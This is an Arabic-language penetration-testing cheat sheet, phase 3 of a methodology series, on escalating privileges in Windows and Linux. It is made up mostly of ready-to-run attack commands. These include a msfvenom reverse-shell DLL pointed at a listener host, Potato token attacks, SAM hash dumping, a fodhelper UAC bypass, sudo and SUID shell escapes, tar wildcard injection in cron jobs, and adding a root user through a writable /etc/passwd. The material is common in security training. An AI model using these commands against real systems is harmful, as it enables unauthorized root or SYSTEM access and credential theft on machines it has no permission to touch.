<a id="-phase-3-privilege-escalation"></a>
# ⬆️ المرحلة 3: تصعيد الصلاحيات (Privilege Escalation)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**الهدف:** رفع الصلاحيات من مستخدم عادي إلى Administrator/SYSTEM في Windows أو root في Linux.

> 📚 **الأدلة الكاملة:** [تصعيد صلاحيات Windows](../../Windows-PrivEsc/README.md) | [تصعيد صلاحيات Linux](../../Linux-PrivEsc/README.md)

---

<a id="-windows-privilege-escalation"></a>
## 🖥️ تصعيد الصلاحيات في Windows

<a id="quick-wins---check-first"></a>
### فحوصات سريعة تُجرى أولاً
```cmd
# فحص الصلاحيات الحالية
whoami /priv
whoami /groups

# البحث عن بيانات اعتماد مخزنة
cmdkey /list

# ملفات التثبيت غير التفاعلي
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<a id="service-exploits"></a>
### استغلال الخدمات

<a id="unquoted-service-path"></a>
#### مسار خدمة غير محاط بعلامات اقتباس
```cmd
# البحث عن المسارات غير المحاطة بعلامات اقتباس
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# إذا وُجد المسار: C:\Program Files\Some Service\service.exe
# وضع ملف exe ضار في: C:\Program.exe أو C:\Program Files\Some.exe
```

<a id="weak-service-permissions"></a>
#### صلاحيات ضعيفة للخدمة
```cmd
# فحص صلاحيات الخدمة باستخدام accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# إذا كانت الصلاحية SERVICE_CHANGE_CONFIG متاحة:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

<a id="dll-hijacking"></a>
#### اختطاف مكتبات DLL
```powershell
# البحث عن خدمات تطلب DLL غير موجودة باستخدام Process Monitor
# وضع DLL ضارة في مجلد الخدمة
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

<a id="token-impersonation"></a>
### انتحال رموز الوصول (Token Impersonation)

<a id="seimpersonateprivilege-potato-attacks"></a>
#### صلاحية SeImpersonatePrivilege (هجمات Potato)
```cmd
# التحقق من امتلاك SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

<a id="sebackupprivilege"></a>
#### صلاحية SeBackupPrivilege
```powershell
# نسخ SAM وSYSTEM احتياطياً
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# استخراج البصمات على جهاز المهاجم
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

<a id="registry-exploits"></a>
### استغلال سجل Windows
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# مسارات قابلة للكتابة للمهام المجدولة
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# صلاحيات سجل Windows
accesschk.exe -kvw hklm\SOFTWARE
```

<a id="uac-bypass"></a>
### تجاوز التحكم في حساب المستخدم (UAC)
```powershell
# التجاوز باستخدام Fodhelper في Windows 10
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

<a id="automated-tools"></a>
### أدوات آلية
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

<a id="-linux-privilege-escalation"></a>
## 🐧 تصعيد الصلاحيات في Linux

<a id="quick-wins---check-first-1"></a>
### فحوصات سريعة تُجرى أولاً
```bash
# صلاحيات sudo
sudo -l

# ملفات SUID التنفيذية
find / -perm -4000 -type f 2>/dev/null

# ملف /etc/passwd قابل للكتابة
ls -la /etc/passwd

# إصدار النواة للبحث عن استغلالات
uname -a
```

<a id="sudo-exploits"></a>
### استغلال sudo

<a id="sudo-without-password"></a>
#### استخدام sudo دون كلمة مرور
```bash
# إذا أظهر sudo -l ما يلي: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# إذا أظهر sudo -l ما يلي: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# إذا أظهر sudo -l ما يلي: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

<a id="sudo-version-exploit-cve-2021-3156"></a>
#### استغلال إصدار sudo (CVE-2021-3156)

> **ملاحظة الإصدارات:** المقارنة المختصرة بإصدار sudo ونطاقات إصدارات النواة المذكورة لاحقاً مؤشرات أولية وليست حكماً مؤكداً بقابلية الاستغلال؛ يجب مراعاة تصحيحات التوزيعة وشروط الثغرة. أُبقيت قيم الأصل دون تغيير.

```bash
# فحص إصدار sudo
sudo --version

# إذا كان sudo < 1.9.5p2
# استخدام شيفرة الاستغلال: https://github.com/blasty/CVE-2021-3156
```

<a id="suidsgid-binaries"></a>
### ملفات تنفيذية تحمل SUID/SGID
```bash
# البحث عن ملفات SUID التنفيذية
find / -perm -4000 -type f 2>/dev/null

# مراجعة GTFOBins لطرق الاستغلال
# https://gtfobins.github.io/

# مثال: SUID على /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# مثال: SUID على /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# مثال: SUID على /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<a id="capabilities"></a>
### إمكانات Linux (Capabilities)
```bash
# البحث عن ملفات تنفيذية تحمل Capabilities
getcap -r / 2>/dev/null

# مثال: cap_setuid على python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<a id="cron-jobs"></a>
### مهام Cron المجدولة
```bash
# فحص مهام Cron
cat /etc/crontab
ls -la /etc/cron.*

# البحث عن سكربتات قابلة للكتابة
# حقن أحرف البدل في tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

<a id="path-hijacking"></a>
### اختطاف مسار البحث PATH
```bash
# إذا استدعت مهمة Cron أو سكربت ملفاً تنفيذياً دون مساره الكامل
# إنشاء ملف تنفيذي ضار في مجلد PATH قابل للكتابة

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

<a id="writable-etcpasswd"></a>
### ملف /etc/passwd قابل للكتابة
```bash
# إذا كان /etc/passwd قابلاً للكتابة
# توليد بصمة كلمة المرور
openssl passwd -1 -salt evil password123

# إضافة مستخدم بصلاحيات root
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# التبديل إلى مستخدم root الجديد
su evil
```

<a id="kernel-exploits"></a>
### استغلال ثغرات النواة
```bash
# فحص إصدار النواة
uname -r
cat /proc/version

# البحث عن شيفرات الاستغلال
searchsploit linux kernel 4.4 privilege escalation

# استغلالات نواة شائعة:
# - DirtyCow (CVE-2016-5195) — النواة 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) — النواة 5.8 - 5.16.11
```

<a id="nfs-exploits"></a>
### استغلال NFS
```bash
# التحقق من no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# إذا كان no_root_squash مفعّلاً:
# تركيب المشاركة وإنشاء ملف SUID تنفيذي بصلاحيات root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# على الجهاز المستهدف:
/mnt/bash -p
```

<a id="automated-tools-1"></a>
### أدوات آلية
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# أداة Linux Smart Enumeration (LSE) للحصر الذكي
./lse.sh -l 2
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="windows-checklist"></a>
### قائمة فحص Windows
```markdown
- [ ] whoami /priv (مثل SeImpersonate وSeBackup وغيرها)
- [ ] مسارات خدمات غير محاطة بعلامات اقتباس
- [ ] صلاحيات خدمة ضعيفة
- [ ] AlwaysInstallElevated
- [ ] بيانات اعتماد مخزنة (cmdkey /list)
- [ ] ملفات Unattend/Sysprep
- [ ] المهام المجدولة
- [ ] تشغيل WinPEAS/PowerUp
```

<a id="linux-checklist"></a>
### قائمة فحص Linux
```markdown
- [ ] sudo -l
- [ ] ملفات SUID التنفيذية (راجع GTFOBins)
- [ ] إمكانات Linux (Capabilities)
- [ ] مهام Cron (سكربتات قابلة للكتابة وأحرف بدل)
- [ ] ملف /etc/passwd قابل للكتابة
- [ ] إصدار النواة (الاستغلالات)
- [ ] NFS no_root_squash
- [ ] تشغيل LinPEAS
```

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

- [تصعيد صلاحيات Windows (كامل)](../../Windows-PrivEsc/README.md)
- [تصعيد صلاحيات Linux (كامل)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**المرحلة السابقة:** [← 02 - حصر المعلومات](./02-Enumeration.ar.md)

**المرحلة التالية:** [04 - الحركة الجانبية →](./04-Lateral-Movement.ar.md)
